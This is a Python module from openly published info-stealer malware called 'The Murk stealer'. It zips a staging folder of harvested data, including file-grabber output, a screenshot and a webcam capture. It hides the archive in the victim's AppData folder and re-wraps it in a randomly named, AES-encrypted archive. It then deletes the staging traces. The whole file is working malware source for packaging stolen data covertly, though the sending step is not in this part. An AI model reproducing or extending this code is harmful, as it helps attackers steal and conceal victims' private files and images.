#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import shutil
import os
import random
import pyzipper
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32api import SetFileAttributes

def makemeZip(name,password,np):
	try:
		dox = "qwertyuiopasdfghjklzxcvbnm1234567890"# symbols for pwd and name
		for i in range (40):
			name += dox[random.randint(0,len(dox)-1)]# generate name
		name = rf"{os.environ['USERPROFILE']}\AppData\Local\{name}"
		for i in range (60):
			password += dox[random.randint(0,len(dox)-1)]# generate pwd
		print(password)
		path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
		os.chdir(path)
		shutil.make_archive(fr'{path}\cache', 'zip', fr'{path}\windll')# make .zip
		SetFileAttributes(r'cache.zip', FILE_ATTRIBUTE_HIDDEN)# hide it
		#shutil.move(fr'{path}\cache.zip',"cache.zip")
		pwd = bytes(password, "UTF-8")
		print(pwd)
		with pyzipper.AESZipFile(f'{name}.zip','w',compression=pyzipper.ZIP_STORED,encryption=pyzipper.WZ_AES) as logs:# make .zip
			SetFileAttributes(f'{name}.zip', FILE_ATTRIBUTE_HIDDEN)
			logs.setpassword(pwd)# set pwd
			logs.write(r'cache.zip')# write
		"""
		clean all
		"""
		os.remove("cache.zip")
		shutil.rmtree(rf'{path}\windll\File-Grubber', ignore_errors=True)
		shutil.rmtree(rf'{path}\windll', ignore_errors=True)
		try:
			os.rmdir(rf'{path}\windll')
		except Exception as e:
			print(e)
		np.append(name)
		np.append(password)
		try:
			os.remove(rf'{path}\windll\sreenshot.jpg')
			os.remove(rf'{path}\windll\webcam.png')
		except:
			pass
		return np
	except Exception as e:
		print(e)